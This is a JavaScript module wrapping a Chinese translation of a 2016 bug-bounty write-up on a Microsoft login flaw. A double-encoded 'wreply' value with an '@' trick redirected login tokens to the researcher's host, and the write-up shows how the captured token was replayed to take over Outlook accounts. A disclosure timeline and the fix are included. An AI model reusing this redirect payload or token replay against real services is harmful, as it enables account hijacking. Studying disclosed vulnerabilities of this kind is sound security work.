const o=`# \u3010\u6F0F\u6D1E\u8D4F\u91D1\u730E\u4EBA\uFF0C\u7ED9\u51FA\u4E86\u5FAE\u8F6FMicrosoft\u7684OAuth\u673A\u5236\u3011\u83B7\u53D6 Outlook\u3001Office \u6216 Azure \u5E10\u6237\u7684\u767B\u5F55\u4EE4\u724C \u2013 Jack

Created: November 6, 2024 11:49 AM
URL: https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/
\u6587\u7AE0\u7C7B\u522B(\u6839\u636EWebStorm\u7684\u76EE\u5F55\u6765): SRC_Bounty_\u8D4F\u91D1

### [**\u83B7\u53D6 Outlook\u3001Office \u6216 Azure \u5E10\u6237\u7684\u767B\u5F55\u4EE4\u724C**](https://whitton.io/articles/obtaining-tokens-outlook-office-azure-account/)April 3, 2016 7:00 AM\xA0\u9605\u8BFB\u65F6\u95F4~3\u5206\u949F

[*\u8FD9\u4E0E Wes\u5728 Live \u4E2D\u7684\u51FA\u8272 OAuth CSRF](https://www.synack.com/2015/10/08/how-i-hacked-hotmail/)\u975E\u5E38\u76F8\u4F3C\uFF0C\u53EA\u662F\u5B83\u4F4D\u4E8E\u4E3B\u8981\u7684 Microsoft \u8EAB\u4EFD\u9A8C\u8BC1\u7CFB\u7EDF\u4E2D\uFF0C\u800C\u4E0D\u662F OAuth \u6279\u51C6\u63D0\u793A\u4E2D\u3002*

\u5FAE\u8F6F\u662F\u4E00\u5BB6\u5E9E\u5927\u7684\u516C\u53F8\uFF0C\u5176\u5404\u79CD\u670D\u52A1\u904D\u5E03\u591A\u4E2A\u9886\u57DF\uFF08\`*.outlook.com\`\u3001\`*.live.com\`\u7B49\u7B49\uFF09\u3002

[\u4E3A\u4E86\u5904\u7406\u8FD9\u4E9B\u670D\u52A1\u4E4B\u95F4\u7684\u8EAB\u4EFD\u9A8C\u8BC1\uFF0C\u9700\u8981\u5411login.live.com](https://login.live.com/)\u3001[login.microsoftonline.com](https://login.microsoftonline.com/)\u548C[login.windows.net](https://login.windows.net/)\u53D1\u51FA\u8BF7\u6C42\u4EE5\u83B7\u53D6\u7528\u6237\u4F1A\u8BDD\u3002

[outlook.office.com](https://outlook.office.com/)\u7684\u6D41\u7A0B\u5982\u4E0B\uFF1A

- \u7528\u6237\u6D4F\u89C8\u5230[https://outlook.office.com](https://outlook.office.com/)
- \u7528\u6237\u88AB\u91CD\u5B9A\u5411\u5230[https://login.microsoftonline.com/login.srf?wa=wsignin1.0&rpsnv=4&wreply=https%3a%2f%2foutlook.office.com%2fowa%2f&id=260563](https://login.microsoftonline.com/login.srf?wa=wsignin1.0&rpsnv=4&wreply=https%3a%2f%2foutlook.office.com%2fowa%2f&id=260563)
- \u5047\u8BBE\u7528\u6237\u5DF2\u767B\u5F55\uFF0C\u5219\u4F1A\u5411 \u53D1\u51FA\u4E00\u4E2A[POST](https://en.wikipedia.org/wiki/POST_(HTTP))\`wreplyt\`
    
    \u8BF7\u6C42\uFF0C\u8FD4\u56DE \u7684\u503C
    
    \uFF0C\u5176\u4E2D\u8868\u5355\u5B57\u6BB5
    
    \u5305\u542B\u7528\u6237\u7684\u767B\u5F55\u4EE4\u724C\uFF1A
    

\`\`\`
<html>
    <head>
        <noscript>JavaScript required to sign in</noscript>
        <title>Continue</title>
        <script type="text/javascript">
            function OnBack(){}function DoSubmit(){var subt=false;if(!subt){subt=true;document.fmHF.submit();}}
        <\/script>
    </head>
    <body onload="javascript:DoSubmit();">
        <form name="fmHF" id="fmHF" action="https://outlook.office.com/owa/?wa=wsignin1.0" method="post" target="_self">
            <input type="hidden" name="t" id="t" value="EgABAgMAAAAEgAAAA...">
        </form>
    </body>
</html>
\`\`\`

- \u7136\u540E\uFF0C\u670D\u52A1\u4F7F\u7528\u8BE5\u4EE4\u724C\u5E76\u8BA9\u7528\u6237\u767B\u5F55\u3002

\u7531\u4E8E\u670D\u52A1\u6258\u7BA1\u5728\u5B8C\u5168\u72EC\u7ACB\u7684\u57DF\u4E0A\uFF0C\u56E0\u6B64\u65E0\u6CD5\u4F7F\u7528 cookie\uFF0C\u4EE4\u724C\u662F\u7528\u6237\u8EAB\u4EFD\u9A8C\u8BC1\u6240\u9700\u7684\u552F\u4E00\u503C\u3002\u8FD9\u4E0E OAuth \u7684\u5DE5\u4F5C\u65B9\u5F0F\u7C7B\u4F3C\u3002

\u8FD9\u610F\u5473\u7740\u5982\u679C\u6211\u4EEC\u53EF\u4EE5\u4F7F\u7528\u4E0A\u8FF0\u4EE3\u7801\u5C06\u503C\u53D1\u5E03\`t\`\u5230\u6211\u4EEC\u63A7\u5236\u7684\u670D\u52A1\u5668\uFF0C\u6211\u4EEC\u5C31\u53EF\u4EE5\u6A21\u4EFF\u7528\u6237\u3002

\u6B63\u5982\u9884\u671F\u7684\u90A3\u6837\uFF0C\u5982\u679C\u6211\u4EEC\u5C1D\u8BD5\u5C06\u7684\u503C\u66F4\u6539\`wreply\`\u4E3A\u975E Microsoft \u57DF\uFF08\u4F8B\u5982\`example.com\`\uFF09\uFF0C\u6211\u4EEC\u4F1A\u6536\u5230\u9519\u8BEF\uFF0C\u5E76\u4E14\u8BF7\u6C42\u4E0D\u4F1A\u88AB\u5904\u7406\uFF1A

![https://whitton.io/images/microsoft/login-3.png](https://whitton.io/images/microsoft/login-3.png)

### URL \u7F16\u7801\u548C URL \u89E3\u6790\u7684\u4E50\u8DA3

\u4E00\u4E2A\u6709\u8DA3\u7684\u6280\u5DE7\u662F\u591A\u6B21\u5BF9[URL](https://en.wikipedia.org/wiki/Percent-encoding)\u53C2\u6570\u8FDB\u884C\u7F16\u7801\u3002\u6709\u65F6\u8FD9\u53EF\u4EE5\u7528\u6765\u7ED5\u8FC7\u4E0D\u540C\u7684\u8FC7\u6EE4\u5668\uFF0C\u8FD9\u662F\u6F0F\u6D1E\u7684\u6839\u672C\u539F\u56E0\u3002

\u5728\u8FD9\u79CD\u60C5\u51B5\u4E0B\uFF0C\`wreply\`\u5728\u68C0\u67E5\u57DF\u4E4B\u524D\u4F1A\u8FDB\u884C URL \u89E3\u7801\u3002\u56E0\u6B64\`https%3a%2f%2foutlook.office.com%2f\`\u53D8\u4E3A\`https://outlook.office.com/\`\uFF0C\u8FD9\u662F\u6709\u6548\u7684\uFF0C\u5E76\u4E14\u8BF7\u6C42\u901A\u8FC7\u3002

\`\`\`
<form name="fmHF" id="fmHF" action="https://outlook.office.com/ ?wa=wsignin1.0" method="post" target="_self">

\`\`\`

\u6709\u8DA3\u7684\u662F\uFF0C\u5F53\u4F20\u9012\u4E00\u4E2A\u503C\u65F6\`https%3a%2f%2foutlook.office.com%252f\`\u4F1A\u629B\u51FA\u4E00\u4E2A\u9519\u8BEF\uFF0C\u56E0\u4E3A\`https://outlook.office.com%2f\`\u4E0D\u662F\u4E00\u4E2A\u6709\u6548\u7684 URL\u3002

\u4F46\u662F\uFF0C\u9644\u52A0\u64CD\u4F5C\`@example.com\`\xA0*\u4E0D\u4F1A*\u4EA7\u751F\u9519\u8BEF\u3002\u76F8\u53CD\uFF0C\u5B83\u8FD4\u56DE\u4EE5\u4E0B\u5185\u5BB9\uFF0C\u8FD9\u662F\u4E00\u4E2A\u6709\u6548\u7684 URL\uFF1A

\`\`\`
<form name="fmHF" id="fmHF" action="https://outlook.office.com%2f@example.com/?wa =wsignin1.0" method="post" target="_self">

\`\`\`

*\u5982\u679C\u60A8\u60F3\u77E5\u9053\u4E3A\u4EC0\u4E48\u8FD9\u662F\u6709\u6548\u7684\uFF0C\u90A3\u662F\u56E0\u4E3A[URL \u7684\u8BED\u6CD5](https://en.wikipedia.org/wiki/Uniform_Resource_Locator#Syntax)\u5982\u4E0B\uFF1A*

\`\`\`
\u65B9\u6848:[//[\u7528\u6237:\u5BC6\u7801@]\u4E3B\u673A[:\u7AEF\u53E3]][/]\u8DEF\u5F84[?\u67E5\u8BE2][#\u7247\u6BB5]

\`\`\`

\u7531\u6B64\u53EF\u4EE5\u770B\u51FA\u670D\u52A1\u5668\u6B63\u5728\u8FDB\u884C\u4E24\u9879\u68C0\u67E5\uFF1A

- \u9996\u5148\u662F\u5BF9 URL \u8FDB\u884C\u5065\u5168\u6027\u68C0\u67E5\uFF0C\u4EE5\u786E\u4FDD\u5176\u6709\u6548\uFF0C\u56E0\u4E3A\`outlook.office.com%2f\`URL \u662F\u7528\u6237\u540D\u7684\u4E00\u90E8\u5206\u3002
- \u7B2C\u4E8C\u4E2A\u662F\u786E\u5B9A\u8BE5\u57DF\u662F\u5426\u88AB\u5141\u8BB8\u3002\u7B2C\u4E8C\u6B21\u68C0\u67E5\u5E94\u8BE5\u5931\u8D25****\`example.com\`\u4E0D\u5141\u8BB8\u3002

\u5F88\u660E\u663E\uFF0C\u670D\u52A1\u5668\u8981\u89E3\u7801\`wreply\`\xA0*n*\u6B21\uFF0C\u76F4\u5230\u4E0D\u518D\u6709\u4EFB\u4F55\u7F16\u7801\u5B57\u7B26\uFF0C\u7136\u540E*\u9A8C\u8BC1*\u57DF\u3002\u8FD9\u79CD\u4E0D\u4E00\u81F4\u7684\u60C5\u51B5\u6211[\u5F88\u719F\u6089](https://whitton.io/articles/safecurl-capture-the-bitcoins-post-mortem/#url-parsing-issue-1)\u3002

\u73B0\u5728\u6211\u4EEC\u53EF\u4EE5\u6307\u5B9A\u4EFB\u610F URL \u6765 POST \u4EE4\u724C\uFF0C\u5269\u4E0B\u7684\u5C31\u5F88\u7B80\u5355\u4E86\u3002\u6211\u4EEC\u5C06\u91CD\u5B9A\u5411\u8BBE\u7F6E\u4E3A\`https%3a%2f%2foutlook.office.com%252f@poc-ssl.fin1te.net%2fmicrosoft%2f%3f\`\uFF0C\u7ED3\u679C\u5982\u4E0B\uFF1A

\`\`\`
<form name="fmHF" id="fmHF" action="https://outlook.office.com%2f@poc-ssl.fin1te.net/microsoft/?&wa=wsignin1.0" method="post" target="_self">

\`\`\`

\u8FD9\u4F1A\u5BFC\u81F4\u4EE4\u724C\u88AB\u53D1\u9001\u5230\u6211\u4EEC\u7684\u7F51\u7AD9\uFF1A

![https://whitton.io/images/microsoft/login-4.png](https://whitton.io/images/microsoft/login-4.png)

\u7136\u540E\u6211\u4EEC\u53EA\u9700\u81EA\u5DF1\u91CD\u653E\u4EE4\u724C\u5373\u53EF\uFF1A

\`\`\`
<form action="https://outlook.office.com/owa/?wa=wsignin1.0" method="post">
    <\u8F93\u5165\u540D\u79F0=\u201Ct\u201D\u503C=\u201CEgABAgMAAAAEgAAAAwAB... \u201D>
    <\u8F93\u5165\u7C7B\u578B=\u201C\u63D0\u4EA4\u201D>
</\u8868\u5355>
\`\`\`

\u8FD9\u6837\u6211\u4EEC\u5C31\u53EF\u4EE5\u5B8C\u5168\u8BBF\u95EE\u7528\u6237\u7684\u8D26\u6237\uFF1A

![https://whitton.io/images/microsoft/login-2.png](https://whitton.io/images/microsoft/login-2.png)

\u6CE8\u610F\uFF1A\u4EE4\u724C\u4EC5\u5BF9\u9881\u53D1\u5B83\u7684\u670D\u52A1\u6709\u6548 - \u4F8B\u5982\uFF0COutlook \u4EE4\u724C\u4E0D\u80FD\u7528\u4E8E Azure\u3002\u4F46\u521B\u5EFA\u591A\u4E2A\u9690\u85CF\u7684 iframe \u5F88\u7B80\u5355\uFF0C\u6BCF\u4E2A iframe \u7684\u767B\u5F55 URL \u90FD\u8BBE\u7F6E\u4E3A\u4E0D\u540C\u7684\u670D\u52A1\uFF0C\u7136\u540E\u901A\u8FC7\u8FD9\u79CD\u65B9\u5F0F\u83B7\u53D6\u4EE4\u724C\u3002

\u8FD9\u662F\u4E00\u4E2A\u975E\u5E38\u6709\u8DA3\u7684 CSRF \u6F0F\u6D1E\uFF0C\u503C\u5F97\u5BFB\u627E\u548C\u5229\u7528\u3002\u5C3D\u7BA1 CSRF \u6F0F\u6D1E\u7684\u53EF\u4FE1\u5EA6\u4E0D\u5982\u5176\u4ED6\u6F0F\u6D1E\uFF0C\u4F46\u5982\u679C\u5728\u8EAB\u4EFD\u9A8C\u8BC1\u7CFB\u7EDF\u4E2D\u53D1\u73B0\uFF0C\u5176\u5F71\u54CD\u53EF\u80FD\u76F8\u5F53\u5927\u3002

## \u4F7F\u56FA\u5B9A

\u73B0\u5728\u4E2D\u7684\u4E3B\u673A\u540D\`wreply\`\u5FC5\u987B\u4EE5 \u7ED3\u5C3E\`%2f\`\uFF0C\u5176 URL \u89E3\u7801\u4E3A\`/\`\u3002

\u8FD9\u53EF\u786E\u4FDD\u6D4F\u89C8\u5668\u53EA\u5C06\u8BF7\u6C42\u53D1\u9001\u5230\u9884\u671F\u7684\u4E3B\u673A\u3002

## \u65F6\u95F4\u7EBF

- 2016 \u5E74 1 \u6708 24 \u65E5\u661F\u671F\u65E5 - \u5DF2\u62A5\u544A\u95EE\u9898
- 2016 \u5E74 1 \u6708 24 \u65E5\u661F\u671F\u65E5 - \u95EE\u9898\u786E\u8BA4\u548C\u5206\u7C7B
- 2016 \u5E74 1 \u6708 26 \u65E5\u661F\u671F\u4E8C - \u95EE\u9898\u5DF2\u4FEE\u590D
`;export{o as _};
